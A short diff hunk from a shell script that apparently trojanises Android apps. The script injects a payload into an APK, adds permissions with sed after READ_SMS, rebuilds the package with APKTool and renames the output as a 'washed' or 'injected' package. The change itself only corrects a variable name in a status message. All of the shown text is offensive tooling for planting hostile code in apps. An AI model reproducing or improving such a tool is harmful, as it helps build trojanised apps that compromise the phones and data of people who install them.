@@ -59,7 +59,7 @@ sed -i '/READ_SMS/a<uses-permission android:name="android.permission.SET_WALLPAP
 #Rebuild the package using APKTool
 java -jar $JAR b /tmp/payload
 echo; 
-echo -e "\033[34m Washed package created: `pwd`/washed_$originalApk \x1B[0m"
+echo -e "\033[34m Washed package created: `pwd`/washed_$APK \x1B[0m"
 echo -e "\033[34m Moving the injected package to the current directory \x1B[0m"
 mv /tmp/payload/dist/$APK washed_$APK
 echo
